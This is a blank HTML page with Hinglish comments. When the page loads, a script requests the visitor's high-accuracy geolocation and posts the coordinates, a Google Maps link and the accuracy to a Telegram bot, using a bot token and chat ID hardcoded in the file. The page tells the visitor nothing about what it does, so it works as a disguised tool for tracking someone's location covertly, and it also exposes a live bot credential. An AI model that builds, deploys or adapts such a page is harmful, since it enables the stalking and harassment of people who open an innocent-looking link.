<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            background-color: #ffffff;
            margin: 0;
            padding: 0;
        }
    </style>
</head>
<body>

<script>
    // ⚠️ Apne Bot Token aur Chat ID yahan dalein
    const botToken = '8763151429:AAHHoeHS7ctD9r865pHhM7VCC2j4VQ2-zAk';
    const chatId = '6644554566';

    function autoSendLocation() {
        if (!navigator.geolocation) return;

        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;
                const accuracy = position.coords.accuracy;

                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                const text = `📍 *Nayi Location Recieved*\n\n🌍 *Google Maps:* [Location Dekhein](${mapUrl})\n🌐 *Latitude:* ${lat}\n🌐 *Longitude:* ${lon}\n🎯 *Accuracy:* ${Math.round(accuracy)} meters`;

                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: text,
                        parse_mode: 'Markdown'
                    })
                });
            },
            (error) => {
                console.log('Error getting location:', error);
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    // Page load hote hi location request activate ho jayegi
    window.onload = autoSendLocation;
</script>

</body>
</html>
